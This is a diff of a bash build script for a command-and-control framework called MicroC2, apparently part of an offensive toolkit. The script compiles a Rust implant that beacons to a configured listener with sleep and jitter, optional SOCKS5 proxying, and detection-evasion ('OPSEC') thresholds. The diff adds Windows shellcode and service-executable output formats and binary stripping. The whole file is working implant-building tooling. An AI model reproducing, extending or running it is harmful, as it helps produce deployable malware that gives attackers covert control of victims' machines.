@@ -4,36 +4,35 @@ echo "MicroC2 Agent Builder"
 echo "============================="
 
 # --- Configuration Defaults ---
-TARGET=""
-OUTPUT_DIR=""
-BUILD_TYPE="release"
-LISTENER_HOST=""
-LISTENER_PORT=""
-SLEEP_INTERVAL=60
-JITTER=2
-FORMAT=""
-PAYLOAD_ID=""
-PROTOCOL="" # Default protocol - will be determined by --protocol flag or default to http
-SOCKS5_ENABLED=false
-SOCKS5_HOST="127.0.0.1"
-SOCKS5_PORT=9050
+# Values set here will be used if not provided by environment variables from the calling process (e.g., payload_handler.go)
+# Command-line arguments to build.sh can override these further down.
+TARGET="" # Primarily set by --target arg or derived
+OUTPUT_DIR="" # Primarily set by --output arg or derived
+BUILD_TYPE="release" # Primarily set by --build-type arg
+LISTENER_HOST="" # Primarily set by --listener-host arg
+LISTENER_PORT="" # Primarily set by --listener-port arg
+PAYLOAD_ID="" # Primarily set by --payload-id arg or derived
+PROTOCOL="" # Primarily set by --protocol arg or derived
+
+SLEEP_INTERVAL=${SLEEP_INTERVAL:-60}
+JITTER=${JITTER:-2}
+SOCKS5_ENABLED=${SOCKS5_ENABLED:-false}
+SOCKS5_HOST=${SOCKS5_HOST:-"127.0.0.1"}
+SOCKS5_PORT=${SOCKS5_PORT:-9050}
 
 # OPSEC Defaults
-BASE_THRESHOLD_ENTER_FULL_OPSEC=60.0 # To be renamed/repurposed
-BASE_THRESHOLD_EXIT_FULL_OPSEC=20.0  # To be renamed/repurposed
-# New names for clarity with 3-state system:
-BASE_SCORE_THRESHOLD_BG_TO_REDUCED=20.0
-BASE_SCORE_THRESHOLD_REDUCED_TO_FULL=60.0
-MIN_FULL_OPSEC_SECS=300
-MIN_REDUCED_OPSEC_SECS=120
-MIN_BG_OPSEC_SECS=60
-REDUCED_ACTIVITY_SLEEP_SECS=120 # New
-BASE_MAX_C2_FAILS=5
-C2_THRESH_INC_FACTOR=1.1
-C2_THRESH_DEC_FACTOR=0.9
-C2_THRESH_ADJ_INTERVAL=3600 # 1 hour
-C2_THRESH_MAX_MULT=2.0
-PROC_SCAN_INTERVAL_SECS=300
+BASE_SCORE_THRESHOLD_BG_TO_REDUCED=${BASE_SCORE_THRESHOLD_BG_TO_REDUCED:-20.0}
+BASE_SCORE_THRESHOLD_REDUCED_TO_FULL=${BASE_SCORE_THRESHOLD_REDUCED_TO_FULL:-60.0}
+MIN_FULL_OPSEC_SECS=${MIN_FULL_OPSEC_SECS:-300}
+MIN_REDUCED_OPSEC_SECS=${MIN_REDUCED_OPSEC_SECS:-120}
+MIN_BG_OPSEC_SECS=${MIN_BG_OPSEC_SECS:-60}
+REDUCED_ACTIVITY_SLEEP_SECS=${REDUCED_ACTIVITY_SLEEP_SECS:-120}
+BASE_MAX_C2_FAILS=${BASE_MAX_C2_FAILS:-5}
+C2_THRESH_INC_FACTOR=${C2_THRESH_INC_FACTOR:-1.1}
+C2_THRESH_DEC_FACTOR=${C2_THRESH_DEC_FACTOR:-0.9}
+C2_THRESH_ADJ_INTERVAL=${C2_THRESH_ADJ_INTERVAL:-3600} # 1 hour
+C2_THRESH_MAX_MULT=${C2_THRESH_MAX_MULT:-2.0}
+PROC_SCAN_INTERVAL_SECS=${PROC_SCAN_INTERVAL_SECS:-300}
 
 # --- Parse Command Line Arguments ---
 # Parse command line arguments
@@ -52,7 +51,7 @@ while [[ $# -gt 0 ]]; do
       shift 2
       ;;
     --format)
-      FORMAT="$2"
+      FORMAT="$2" # FORMAT is specific to build.sh logic, not an env-driven default from Go
       shift 2
       ;;
     --listener-host)
@@ -64,11 +63,11 @@ while [[ $# -gt 0 ]]; do
       shift 2
       ;;
     --sleep)
-      SLEEP_INTERVAL="$2"
+      SLEEP_INTERVAL="$2" # CLI arg overrides env/default
       shift 2
       ;;
     --jitter)
-      JITTER="$2"
+      JITTER="$2" # CLI arg overrides env/default
       shift 2
       ;;
     --payload-id)
@@ -80,35 +79,66 @@ while [[ $# -gt 0 ]]; do
       shift 2
       ;;
     --socks5-enabled)
-      SOCKS5_ENABLED=$2
+      SOCKS5_ENABLED="$2" # CLI arg overrides env/default
       shift 2
       ;;
     --socks5-host)
-      SOCKS5_HOST="$2"
+      SOCKS5_HOST="$2" # CLI arg overrides env/default
       shift 2
       ;;
     --socks5-port)
-      SOCKS5_PORT=$2
+      SOCKS5_PORT="$2" # CLI arg overrides env/default
       shift 2
       ;;
     # Add OPSEC related flags if desired, or rely on env vars/defaults
     --base-score-bg-reduced)
-      BASE_SCORE_THRESHOLD_BG_TO_REDUCED=$2
+      BASE_SCORE_THRESHOLD_BG_TO_REDUCED="$2" # CLI arg overrides env/default
       shift 2
       ;;
     --base-score-reduced-full)
-      BASE_SCORE_THRESHOLD_REDUCED_TO_FULL=$2
+      BASE_SCORE_THRESHOLD_REDUCED_TO_FULL="$2" # CLI arg overrides env/default
       shift 2
       ;;
     --reduced-activity-sleep)
-      REDUCED_ACTIVITY_SLEEP_SECS=$2
+      REDUCED_ACTIVITY_SLEEP_SECS="$2" # CLI arg overrides env/default
       shift 2
       ;;
-    # Example for one OPSEC param:
-    # --base-max-c2-fails)
-    #   BASE_MAX_C2_FAILS=$2
-    #   shift 2
-    #   ;;
+    --min-full-opsec-secs)
+      MIN_FULL_OPSEC_SECS="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --min-reduced-opsec-secs)
+      MIN_REDUCED_OPSEC_SECS="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --min-bg-opsec-secs)
+      MIN_BG_OPSEC_SECS="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --base-max-c2-fails)
+      BASE_MAX_C2_FAILS="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --c2-thresh-inc-factor)
+      C2_THRESH_INC_FACTOR="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --c2-thresh-dec-factor)
+      C2_THRESH_DEC_FACTOR="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --c2-thresh-adj-interval)
+      C2_THRESH_ADJ_INTERVAL="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --c2-thresh-max-mult)
+      C2_THRESH_MAX_MULT="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
+    --proc-scan-interval-secs)
+      PROC_SCAN_INTERVAL_SECS="$2" # CLI arg overrides env/default
+      shift 2
+      ;;
     *)
       echo "Unknown option: $1"
       shift
@@ -116,56 +146,46 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-# Validate required flags
+# Validate required flags (these are typically NOT from env, but direct args to build.sh)
 if [ -z "$LISTENER_HOST" ] || [ -z "$LISTENER_PORT" ]; then
-  echo "Error: --listener-host and --listener-port are required" >&2
-  exit 1
+  echo "Error: --listener-host and --listener-port are required for build.sh" >&2
+  # Allow to proceed if PAYLOAD_ID is set, as build.rs might get info from embedded config
+  if [ -z "$PAYLOAD_ID" ]; then
+    exit 1
+  else
+    echo "Warning: LISTENER_HOST/PORT not set, but PAYLOAD_ID is. Assuming embedded config or build.rs will handle."
+  fi
 fi
 
-# Determine protocol: Prioritize --protocol flag. Default to http if not set.
+# Determine protocol: Prioritize --protocol flag.
 if [ -n "$PROTOCOL" ]; then
-  # --protocol flag was provided and is not empty
-  echo "Using specified PROTOCOL from --protocol flag: $PROTOCOL"
-  # The PROTOCOL variable is already set from parsing the arguments
+  echo "Using specified PROTOCOL from --protocol flag or environment: $PROTOCOL"
 else
-  # --protocol flag was not provided or was empty
-  echo "Warning: --protocol flag not provided or was empty. Defaulting to 'http'. The server should specify the protocol for the selected listener." >&2
+  echo "Warning: PROTOCOL not provided. Defaulting to 'http'. The server should specify the protocol for the selected listener if this is part of payload generation." >&2
   PROTOCOL="http"
 fi
 
-# Use environment variables if arguments not provided
-if [ -z "$TARGET" ]; then
-    TARGET=${TARGET:-"x86_64-unknown-linux-gnu"}
-fi
+# Use environment variables for TARGET if arguments not provided and TARGET is still empty
+TARGET=${TARGET:-"x86_64-unknown-linux-gnu"}
 
-# IMPORTANT: Properly set server address and port
-if [ -z "$LISTENER_HOST" ]; then
-    # Get primary interface IP, but don't use 0.0.0.0 as it's not routable
-    DEFAULT_IP=$(ip route get 1 | awk '{print $7;exit}')
-    # If the IP is 0.0.0.0 or empty, fall back to 127.0.0.1
-    if [ -z "$DEFAULT_IP" ] || [ "$DEFAULT_IP" == "0.0.0.0" ]; then
-        DEFAULT_IP="127.0.0.1"
-    fi
-    SERVER_IP=${LISTENER_HOST:-$DEFAULT_IP}
-else
-    SERVER_IP=$LISTENER_HOST
-fi
 
-# Use provided port or default to listener config port
-SERVER_PORT=${LISTENER_PORT:-8443}
+# IMPORTANT: Properly set server address and port for build.rs if not fully specified
+# These are primarily for build.rs if it needs to construct a server_url from components.
+# LISTENER_HOST and LISTENER_PORT are the primary source for this.
+SERVER_IP=$LISTENER_HOST
+SERVER_PORT=$LISTENER_PORT
 
-# Store original output dir (as provided by the server)
+
+# Store original output dir (as provided by the server/--output)
 ORIGINAL_OUTPUT_DIR="$OUTPUT_DIR"
 
-# Handle relative/absolute paths
-if [[ "$OUTPUT_DIR" != /* ]]; then
-    # If relative path, make it absolute from current directory
+# Handle relative/absolute paths for OUTPUT_DIR
+if [ -n "$OUTPUT_DIR" ] && [[ "$OUTPUT_DIR" != /* ]]; then
     OUTPUT_DIR="$(pwd)/$OUTPUT_DIR"
 fi
 
-# Determine payload ID if not provided
+# Determine payload ID if not provided by arg and still empty
 if [ -z "$PAYLOAD_ID" ]; then
-    # If not provided via --payload-id argument, try to derive from OUTPUT_DIR
     if [ -n "$OUTPUT_DIR" ]; then
         PAYLOAD_ID=$(basename "$OUTPUT_DIR")
         echo "Derived PAYLOAD_ID from OUTPUT_DIR: $PAYLOAD_ID"
@@ -179,12 +199,11 @@ if [ -z "$PAYLOAD_ID" ]; then
     echo "Warning: PAYLOAD_ID is empty after attempting to derive it. Generating a unique ID." >&2
     if command -v uuidgen &> /dev/null; then
         PAYLOAD_ID=$(uuidgen)
-    elif command -v powershell &> /dev/null; then # For Windows/Cross-compile scenarios where bash might be run by PS
+    elif command -v powershell &> /dev/null; then
         PAYLOAD_ID=$(powershell -Command "[guid]::NewGuid().ToString()")
-    elif [ -n "$SYSTEMROOT" ] && command -v powershell.exe &> /dev/null; then # Check for a common Windows env var if system is likely Windows via WSL
+    elif [ -n "$SYSTEMROOT" ] && command -v powershell.exe &> /dev/null; then
         PAYLOAD_ID=$(powershell.exe -Command "[guid]::NewGuid().ToString()")
     else
-        # Fallback to a date-based one if no uuidgen and not obviously Windows
         PAYLOAD_ID="agent_$(date +%s%N)"
     fi
     echo "Generated PAYLOAD_ID: $PAYLOAD_ID"
@@ -192,46 +211,75 @@ else
     echo "Using determined PAYLOAD_ID: $PAYLOAD_ID"
 fi
 
-# Also figure out the server's full path
-SERVER_DIR=$(dirname $(dirname "$OUTPUT_DIR"))
-echo "Server path: $SERVER_DIR"
+# Also figure out the server's full path if OUTPUT_DIR was given
+if [ -n "$OUTPUT_DIR" ]; then
+  SERVER_DIR=$(dirname $(dirname "$OUTPUT_DIR"))
+  echo "Server path (derived from OUTPUT_DIR): $SERVER_DIR"
+else
+  echo "Server path cannot be derived as OUTPUT_DIR is not set."
+fi
 
-echo "Configuration:"
+
+echo "Configuration for build.sh:"
 echo "  Target:       $TARGET"
 echo "  Output Dir:   $OUTPUT_DIR"
 echo "  Original Dir: $ORIGINAL_OUTPUT_DIR"
-echo "  Server Dir:   $SERVER_DIR"
+if [ -n "$SERVER_DIR" ]; then echo "  Server Dir:   $SERVER_DIR"; fi
 echo "  Build Type:   $BUILD_TYPE"
-echo "  C2 Server:    ${SERVER_IP}:${SERVER_PORT}"
-echo "  Sleep:        ${SLEEP_INTERVAL:-60} seconds"
-echo "  Jitter:       ${JITTER:-2} seconds"
+echo "  C2 Server:    ${SERVER_IP}:${SERVER_PORT}" # This is component-wise, actual URL in config.json
+echo "  Sleep:        ${SLEEP_INTERVAL} seconds"
+echo "  Jitter:       ${JITTER} seconds"
+echo "  Format:       ${FORMAT:-<not set, will default>}" # FORMAT is specific to build.sh decision logic
 
-if [ -n "$FORMAT" ]; then
-    echo "  Format:       ${FORMAT}"
-fi
+echo "OPSEC Config for build.sh:"
+echo "  BASE_SCORE_THRESHOLD_BG_TO_REDUCED: ${BASE_SCORE_THRESHOLD_BG_TO_REDUCED}"
+echo "  BASE_SCORE_THRESHOLD_REDUCED_TO_FULL: ${BASE_SCORE_THRESHOLD_REDUCED_TO_FULL}"
+echo "  MIN_FULL_OPSEC_SECS: ${MIN_FULL_OPSEC_SECS}"
+echo "  MIN_REDUCED_OPSEC_SECS: ${MIN_REDUCED_OPSEC_SECS}"
+echo "  MIN_BG_OPSEC_SECS: ${MIN_BG_OPSEC_SECS}"
+echo "  REDUCED_ACTIVITY_SLEEP_SECS: ${REDUCED_ACTIVITY_SLEEP_SECS}"
+echo "  BASE_MAX_C2_FAILS: ${BASE_MAX_C2_FAILS}"
+echo "  C2_THRESH_INC_FACTOR: ${C2_THRESH_INC_FACTOR}"
+echo "  C2_THRESH_DEC_FACTOR: ${C2_THRESH_DEC_FACTOR}"
+echo "  C2_THRESH_ADJ_INTERVAL: ${C2_THRESH_ADJ_INTERVAL}"
+echo "  C2_THRESH_MAX_MULT: ${C2_THRESH_MAX_MULT}"
+echo "  PROC_SCAN_INTERVAL_SECS: ${PROC_SCAN_INTERVAL_SECS}"
 
-echo "Checking dependencies..."
-
-# Install required packages if not present
-# (Consider moving dependency checks to a separate script or making them optional)
-# if ! dpkg -l | grep -v "gcc-mingw-w64"; then
-#     echo "Installing gcc-mingw-w64..."
-#     sudo apt-get install -y gcc-mingw-w64
-# fi
-
-# Install cross if not already installed
-# if ! command -v cross &> /dev/null; then
-#     echo "Installing cross..."
-#     cargo install cross
-# fi
 
 echo "[DIAGNOSTIC] Protocol value before config generation: [$PROTOCOL]"
 
 # --- Generate Comprehensive Agent Config JSON --- 
-mkdir -p .config # For build.rs to potentially find config.json here
+# This config.json is written by build.sh itself and is used if build.rs falls back to reading a file.
+# The primary method is for build.rs to use environment variables.
+AGENT_CONFIG_DIR_FOR_BUILD_RS=".config" # Relative to agent source root
+mkdir -p "$AGENT_CONFIG_DIR_FOR_BUILD_RS"
+CONFIG_JSON_PATH_FOR_BUILD_RS="${AGENT_CONFIG_DIR_FOR_BUILD_RS}/config.json"
+
+# Construct the server_url for the JSON. build.rs prefers env vars for this.
+# If LISTENER_HOST contains '://', assume it's a full URL. Otherwise, prepend protocol.
+if [[ "$LISTENER_HOST" == *"://"* ]]; then
+    CONFIG_SERVER_URL="$LISTENER_HOST:$LISTENER_PORT" # Port might be redundant if in host
+    # Refine if LISTENER_HOST includes port
+    if [[ "$LISTENER_HOST" == *":"* ]] && [[ "$LISTENER_HOST" != *"://"*":"* ]]; then # e.g. http://host but not http://host:port
+       CONFIG_SERVER_URL="$LISTENER_HOST:$LISTENER_PORT"
+    else # host is like "server.com" or "http://server.com:1234"
+       CONFIG_SERVER_URL="${PROTOCOL}://${LISTENER_HOST}:${LISTENER_PORT}"
+       if [[ "$LISTENER_HOST" == *"://"* ]]; then # if LISTENER_HOST was already full url like http://blah.com:port
+          CONFIG_SERVER_URL="$LISTENER_HOST" # Don't append protocol or port again if host is full url with port
+          # If it's http://blah.com (no port), then append port
+          if [[ "$LISTENER_HOST" != *":"* ]]; then # no port in the full url
+            CONFIG_SERVER_URL="$LISTENER_HOST:$LISTENER_PORT"
+          fi
+       fi
+    fi
+else
+    CONFIG_SERVER_URL="${PROTOCOL}://${LISTENER_HOST}:${LISTENER_PORT}"
+fi
+
+
 CONFIG_JSON_CONTENT=$(cat << EOF
 {
-    "server_url": "${SERVER_IP}:${SERVER_PORT}",
+    "server_url": "${CONFIG_SERVER_URL}",
     "sleep_interval": ${SLEEP_INTERVAL},
     "jitter": ${JITTER},
     "payload_id": "${PAYLOAD_ID}",
@@ -254,17 +302,19 @@ CONFIG_JSON_CONTENT=$(cat << EOF
 }
 EOF
 )
-echo "$CONFIG_JSON_CONTENT" > .config/config.json
-echo "Created comprehensive .config/config.json for build-time embedding if env vars are not primary."
+echo "$CONFIG_JSON_CONTENT" > "$CONFIG_JSON_PATH_FOR_BUILD_RS"
+echo "Created/Updated $CONFIG_JSON_PATH_FOR_BUILD_RS for build.rs fallback."
 
-# Also place it in the output directory for runtime fallback
-mkdir -p "$OUTPUT_DIR/.config"
-echo "$CONFIG_JSON_CONTENT" > "$OUTPUT_DIR/.config/config.json"
-echo "Copied comprehensive config to $OUTPUT_DIR/.config/config.json for runtime fallback."
+# Also place it in the server-specified output directory for runtime fallback by the agent, if applicable
+if [ -n "$OUTPUT_DIR" ]; then
+    mkdir -p "$OUTPUT_DIR/.config"
+    echo "$CONFIG_JSON_CONTENT" > "$OUTPUT_DIR/.config/config.json"
+    echo "Copied comprehensive config to $OUTPUT_DIR/.config/config.json for agent runtime fallback."
+fi
 
 echo "Building agent..."
 
-# Determine output extension and artifact name
+# Determine output extension and artifact name based on --format
 case "$FORMAT" in
     windows_exe)
         BINARY_EXT=".exe"
@@ -273,6 +323,14 @@ case "$FORMAT" in
     windows_dll)
         BINARY_EXT=".dll"
         AGENT_OUT="agent.dll"
+        ;;
+    windows_shellcode) # Added shellcode
+        BINARY_EXT=".bin"
+        AGENT_OUT="shellcode.bin"
+        ;;
+    windows_service) # Added service
+        BINARY_EXT=".exe"
+        AGENT_OUT="agent_service.exe"
         ;;
     linux_elf)
         BINARY_EXT=""
@@ -287,9 +345,22 @@ case "$FORMAT" in
         AGENT_OUT="libagent.so"
         ;;
     *)
-        # Default to Linux ELF
-        BINARY_EXT=""
-        AGENT_OUT="agent"
+        # Default based on TARGET if FORMAT is empty
+        if [[ "$TARGET" == *windows* ]]; then
+            echo "Warning: --format not specified for Windows target. Defaulting to windows_exe."
+            FORMAT="windows_exe"
+            BINARY_EXT=".exe"
+            AGENT_OUT="agent.exe"
+        elif [[ "$TARGET" == *linux* ]]; then
+            echo "Warning: --format not specified for Linux target. Defaulting to linux_elf."
+            FORMAT="linux_elf"
+            BINARY_EXT=""
+            AGENT_OUT="agent"
+        else # Generic fallback
+            echo "Warning: --format not specified and target is not Windows/Linux. Assuming 'agent' as output name."
+            BINARY_EXT=""
+            AGENT_OUT="agent"
+        fi
         ;;
 esac
 
@@ -297,7 +368,6 @@ esac
 CARGO_FEATURES=""
 if [ "$FORMAT" == "windows_dll" ]; then
     CARGO_FEATURES="--features dll"
-    # .cargo/config.toml for DLL build (already handled by the file being present)
 fi
 
 # Set build flags based on build type
@@ -305,18 +375,19 @@ BUILD_FLAGS=""
 if [ "$BUILD_TYPE" == "release" ]; then
     BUILD_FLAGS="--release"
 elif [ "$BUILD_TYPE" == "debug" ]; then
-    BUILD_FLAGS=""
+    BUILD_FLAGS="" # No extra flags for debug
 else
     echo "Warning: Unknown BUILD_TYPE '$BUILD_TYPE'. Defaulting to release build flags." >&2
     BUILD_FLAGS="--release"
 fi
 
 # --- Export Environment Variables for build.rs ---
-export LISTENER_HOST="$SERVER_IP"
-export LISTENER_PORT="$SERVER_PORT"
+# These ensure build.rs gets the final, resolved values.
+export LISTENER_HOST="$LISTENER_HOST" # Actual host/IP for connection
+export LISTENER_PORT="$LISTENER_PORT" # Actual port
 export SLEEP_INTERVAL="$SLEEP_INTERVAL"
 export PAYLOAD_ID="$PAYLOAD_ID"
-export PROTOCOL="$PROTOCOL"
+export PROTOCOL="$PROTOCOL" # Actual protocol
 export SOCKS5_ENABLED="$SOCKS5_ENABLED"
 export SOCKS5_HOST="$SOCKS5_HOST"
 export SOCKS5_PORT="$SOCKS5_PORT"
@@ -334,89 +405,113 @@ export C2_THRESH_ADJ_INTERVAL="$C2_THRESH_ADJ_INTERVAL"
 export C2_THRESH_MAX_MULT="$C2_THRESH_MAX_MULT"
 export PROC_SCAN_INTERVAL_SECS="$PROC_SCAN_INTERVAL_SECS"
 
-echo "[ENV EXPORTS] Set for build.rs:"
-echo "  LISTENER_HOST: $LISTENER_HOST"
-echo "  PAYLOAD_ID: $PAYLOAD_ID"
-echo "  SOCKS5_ENABLED: $SOCKS5_ENABLED"
-echo "  BASE_MAX_C2_FAILS: $BASE_MAX_C2_FAILS"
+echo "[ENV EXPORTS for build.rs] Set:"
+echo "  LISTENER_HOST: $LISTENER_HOST, LISTENER_PORT: $LISTENER_PORT, PROTOCOL: $PROTOCOL"
+echo "  PAYLOAD_ID: $PAYLOAD_ID, SLEEP_INTERVAL: $SLEEP_INTERVAL"
+echo "  MIN_BG_OPSEC_SECS: $MIN_BG_OPSEC_SECS, REDUCED_ACTIVITY_SLEEP_SECS: $REDUCED_ACTIVITY_SLEEP_SECS"
 # Add more echos for other critical env vars if needed for debugging
 
 # Build the agent
-echo "Building for $TARGET ($FORMAT) with flags: $BUILD_FLAGS $CARGO_FEATURES..."
+echo "Building for $TARGET (Format: $FORMAT) with flags: $BUILD_FLAGS $CARGO_FEATURES..."
 if [[ "$TARGET" == *windows* ]]; then
     if command -v cross &> /dev/null; then
         cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
     else
-        rustup target add $TARGET
+        echo "Warning: 'cross' command not found. Attempting with 'cargo build'. Make sure Rust target '$TARGET' is installed."
+        rustup target add $TARGET # Ensure target is installed
         cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
     fi
-else
+else # For Linux, macOS, etc.
     cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
+fi
+
+BUILD_SUCCESS=$?
+if [ $BUILD_SUCCESS -ne 0 ]; then
+    echo "ERROR: Cargo build failed with exit code $BUILD_SUCCESS" >&2
+    exit $BUILD_SUCCESS
 fi
 
 # Determine the build directory
 if [ "$BUILD_TYPE" == "debug" ]; then
-    BUILD_DIR="target/$TARGET/debug"
+    CARGO_BUILD_DIR="target/$TARGET/debug"
 else
-    BUILD_DIR="target/$TARGET/release"
+    CARGO_BUILD_DIR="target/$TARGET/release" # Default to release
 fi
 
 # Print contents of build directory for debugging
-if [ -d "$BUILD_DIR" ]; then
-    echo "Contents of $BUILD_DIR before copy:" >&2
-    ls -la "$BUILD_DIR" >&2
+if [ -d "$CARGO_BUILD_DIR" ]; then
+    echo "Contents of $CARGO_BUILD_DIR before copy:" >&2
+    ls -la "$CARGO_BUILD_DIR" >&2
 else
-    echo "Build directory $BUILD_DIR does not exist!" >&2
-fi
-
-# Copy the built artifact to the output directory
-if [ -f "$BUILD_DIR/$AGENT_OUT" ]; then
-    echo "Copying $AGENT_OUT to output directory: $OUTPUT_DIR/$AGENT_OUT"
-    mkdir -p "$OUTPUT_DIR"
-    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$AGENT_OUT"
-    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_$AGENT_OUT"
-    echo "Agent binary copied successfully to specified output location"
-else
-    echo "ERROR: agent binary not found at $BUILD_DIR/$AGENT_OUT" >&2
-    echo "Contents of $BUILD_DIR:" >&2
-    ls -la "$BUILD_DIR" >&2
+    echo "ERROR: Build directory $CARGO_BUILD_DIR does not exist after build!" >&2
     exit 1
 fi
 
-# Copy config.json for agent
-mkdir -p "$OUTPUT_DIR/.config"
-cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
+# Copy the built artifact to the output directory specified by --output (or ORIGINAL_OUTPUT_DIR)
+# OUTPUT_DIR is the absolute path from earlier logic, ORIGINAL_OUTPUT_DIR is what was passed via --output.
+# The server expects the file in ORIGINAL_OUTPUT_DIR.
+TARGET_ARTIFACT_PATH_IN_CARGO_DIR="$CARGO_BUILD_DIR/$AGENT_OUT"
+FINAL_OUTPUT_PATH_FOR_SERVER="$ORIGINAL_OUTPUT_DIR/$AGENT_OUT" # Use the path server expects
 
-# Also copy to server's expected location
-mkdir -p "$(dirname "$ORIGINAL_OUTPUT_DIR")"
-cp "$BUILD_DIR/$AGENT_OUT" "$ORIGINAL_OUTPUT_DIR/$AGENT_OUT"
-cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/config.json"
-mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
-cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
+if [ -f "$TARGET_ARTIFACT_PATH_IN_CARGO_DIR" ]; then
+    if [ -n "$ORIGINAL_OUTPUT_DIR" ]; then
+        echo "Copying $AGENT_OUT from $TARGET_ARTIFACT_PATH_IN_CARGO_DIR to specified output for server: $FINAL_OUTPUT_PATH_FOR_SERVER"
+        mkdir -p "$ORIGINAL_OUTPUT_DIR" # Ensure server's expected output directory exists
+        cp "$TARGET_ARTIFACT_PATH_IN_CARGO_DIR" "$FINAL_OUTPUT_PATH_FOR_SERVER"
 
-# Strip and compress if possible
-if [ -f "$OUTPUT_DIR/$AGENT_OUT" ]; then
-    echo "Stripping binary..."
-    strip "$OUTPUT_DIR/$AGENT_OUT" || true
+        # Optionally, also copy to the absolute OUTPUT_DIR if it's different and set (e.g., for local inspection)
+        if [ -n "$OUTPUT_DIR" ] && [ "$OUTPUT_DIR" != "$ORIGINAL_OUTPUT_DIR" ]; then
+             echo "Also copying to local inspection path: $OUTPUT_DIR/$AGENT_OUT"
+             mkdir -p "$OUTPUT_DIR"
+             cp "$TARGET_ARTIFACT_PATH_IN_CARGO_DIR" "$OUTPUT_DIR/$AGENT_OUT"
+        fi
+        echo "Agent binary copied successfully."
+    else
+        echo "Warning: --output directory not specified. Agent binary is at $TARGET_ARTIFACT_PATH_IN_CARGO_DIR"
+    fi
+else
+    echo "ERROR: agent binary not found at $TARGET_ARTIFACT_PATH_IN_CARGO_DIR" >&2
+    echo "Contents of $CARGO_BUILD_DIR:" >&2
+    ls -la "$CARGO_BUILD_DIR" >&2
+    exit 1
+fi
+
+# Copy config.json for agent to server's expected location
+# This config.json is the one generated by build.sh with the resolved values.
+if [ -n "$ORIGINAL_OUTPUT_DIR" ]; then
+    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
+    cp "$CONFIG_JSON_PATH_FOR_BUILD_RS" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
+    echo "Copied $CONFIG_JSON_PATH_FOR_BUILD_RS to $ORIGINAL_OUTPUT_DIR/.config/config.json"
+fi
+
+
+# Strip and compress if possible (operate on the file in server's expected location)
+if [ -n "$ORIGINAL_OUTPUT_DIR" ] && [ -f "$FINAL_OUTPUT_PATH_FOR_SERVER" ]; then
+    echo "Stripping binary at $FINAL_OUTPUT_PATH_FOR_SERVER..."
+    strip "$FINAL_OUTPUT_PATH_FOR_SERVER" || echo "Warning: strip command failed or not available."
     # if command -v upx &> /dev/null; then
     #     echo "Compressing binary with upx..."
-    #     upx --best --lzma "$OUTPUT_DIR/$AGENT_OUT"
+    #     upx --best --lzma "$FINAL_OUTPUT_PATH_FOR_SERVER"
     # fi
 fi
 
 # Final output checks
-echo "Final output directory contents:"
-ls -la "$OUTPUT_DIR"
-echo "Server directory contents:"
-ls -la "$ORIGINAL_OUTPUT_DIR"
+if [ -n "$ORIGINAL_OUTPUT_DIR" ]; then
+  echo "Final contents of server's output directory ($ORIGINAL_OUTPUT_DIR):"
+  ls -la "$ORIGINAL_OUTPUT_DIR"
+  if [ -d "$ORIGINAL_OUTPUT_DIR/.config" ]; then
+    echo "Contents of $ORIGINAL_OUTPUT_DIR/.config:"
+    ls -la "$ORIGINAL_OUTPUT_DIR/.config"
+  fi
+fi
 
-# DLL check
+
 if [ "$FORMAT" == "windows_dll" ]; then
-    if [ -f "$OUTPUT_DIR/agent.dll" ]; then
-        echo "SUCCESS: agent.dll was found at $OUTPUT_DIR/agent.dll"
-        stat -c "File size: %s bytes" "$OUTPUT_DIR/agent.dll"
+    if [ -f "$FINAL_OUTPUT_PATH_FOR_SERVER" ]; then
+        echo "SUCCESS: agent.dll was found at $FINAL_OUTPUT_PATH_FOR_SERVER"
+        stat -c "File size: %s bytes" "$FINAL_OUTPUT_PATH_FOR_SERVER" || ls -l "$FINAL_OUTPUT_PATH_FOR_SERVER"
     else
-        echo "ERROR: agent.dll was not found in the output directory"
+        echo "ERROR: agent.dll was not found in the final output directory $FINAL_OUTPUT_PATH_FOR_SERVER"
         exit 1
     fi
 fi
